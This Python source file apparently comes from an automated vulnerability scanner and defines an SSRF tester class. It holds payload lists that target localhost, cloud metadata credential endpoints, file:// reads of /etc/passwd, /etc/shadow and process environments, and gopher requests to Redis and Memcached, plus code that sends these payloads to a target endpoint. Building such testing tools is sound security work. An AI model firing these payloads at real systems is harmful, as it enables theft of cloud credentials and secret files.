"""SSRF Tester — tests for Server-Side Request Forgery."""

from __future__ import annotations

from typing import Any

from demogorgon.executors.base import BaseExecutor


class SSRFTester(BaseExecutor):
    """Tests for SSRF using internal URLs and cloud metadata endpoints."""

    # Internal URLs to test
    INTERNAL_URLS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://[::1]",
        "http://0x7f000001",
        "http://2130706433",
        "http://0177.0.0.1",
        "http://127.1",
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:8443",
        "http://internal-service",
        "http://backend",
        "http://app",
        "http://database",
        "http://redis",
        "http://mongo",
    ]

    # Cloud metadata paths
    CLOUD_PATHS = [
        "/latest/meta-data/",
        "/latest/meta-data/iam/security-credentials/",
        "/latest/user-data/",
        "/computeMetadata/v1/",
        "/metadata/v1/",
    ]

    # File protocols
    FILE_PROTOCOLS = [
        "file:///etc/passwd",
        "file:///etc/shadow",
        "file:///proc/self/environ",
        "file:///proc/self/cmdline",
        "file:///proc/net/tcp",
        "file:///etc/hosts",
    ]

    # Gopher protocol
    GOPHER_PAYLOADS = [
        "gopher://127.0.0.1:6379/_INFO",
        "gopher://127.0.0.1:11211/_stats",
        "gopher://127.0.0.1:3306/",
    ]

    @property
    def name(self) -> str:
        return "ssrf_tester"

    @property
    def vuln_class(self) -> str:
        return "ssrf"

    @property
    def description(self) -> str:
        return "Tests for SSRF using internal URLs, cloud metadata, and protocol smuggling"

    async def test(self, endpoint: str, **kwargs) -> dict[str, Any]:
        findings = []
        evidence = []
        http = kwargs.get("http_client")
        headers = kwargs.get("headers", {})
        param_name = kwargs.get("param_name", "url")

        if not http:
            return {"findings": [], "evidence": [], "error": "No HTTP client"}

        # Test internal URLs
        for url in self.INTERNAL_URLS:
            result = await self._test_url(http, endpoint, param_name, url, headers)
            evidence.append(result["evidence"])

            if result["vulnerable"]:
                findings.append(self._create_finding(
                    title=f"SSRF — internal URL access via {param_name}",
                    severity="critical",
                    endpoint=endpoint,
                    evidence=f"Internal URL {url} was accessed. Response: {result['evidence']['response_snippet'][:200]}",
                    steps=[
                        f"Set {param_name} to {url}",
                        "Observe response containing internal data",
                        "Pivot to cloud metadata endpoints",
                    ],
                    impact="Internal network access, cloud metadata theft, potential RCE",
                    confidence=0.9,
                ))

        # Test file protocol
        for url in self.FILE_PROTOCOLS:
            result = await self._test_url(http, endpoint, param_name, url, headers)
            evidence.append(result["evidence"])

            if result["vulnerable"]:
                findings.append(self._create_finding(
                    title=f"SSRF — file read via {param_name}",
                    severity="critical",
                    endpoint=endpoint,
                    evidence=f"File URL {url} was accessed. Response: {result['evidence']['response_snippet'][:200]}",
                    steps=[
                        f"Set {param_name} to {url}",
                        "Observe file contents in response",
                        "Read sensitive files like /etc/passwd",
                    ],
                    impact="Arbitrary file read, credential theft",
                    confidence=0.95,
                ))

        return {
            "findings": [f.to_dict() for f in findings],
            "evidence": evidence,
            "tested_count": len(self.INTERNAL_URLS) + len(self.FILE_PROTOCOLS),
            "vulnerable": len(findings) > 0,
        }

    async def _test_url(self, http, endpoint: str, param_name: str,
                        payload: str, headers: dict) -> dict:
        """Test a single URL payload."""
        # Try GET with parameter
        test_url = f"{endpoint}?{param_name}={payload}"
        result = await http.request("GET", test_url, headers=headers)

        # Check for SSRF indicators
        body = result.get("body", "")
        vulnerable = False
        indicators = []

        # Check for internal data
        if "root:" in body or "/etc/passwd" in body:
            vulnerable = True
            indicators.append("passwd file content")
        if "ami-" in body or "instance-id" in body:
            vulnerable = True
            indicators.append("AWS metadata")
        if "metadata" in body.lower() and "google" in body.lower():
            vulnerable = True
            indicators.append("GCP metadata")
        if "127.0.0.1" in body or "localhost" in body:
            vulnerable = True
            indicators.append("localhost response")

        return {
            "vulnerable": vulnerable,
            "evidence": {
                "payload": payload,
                "status": result["status_code"],
                "length": len(body),
                "response_snippet": body[:500],
                "indicators": indicators,
            },
        }
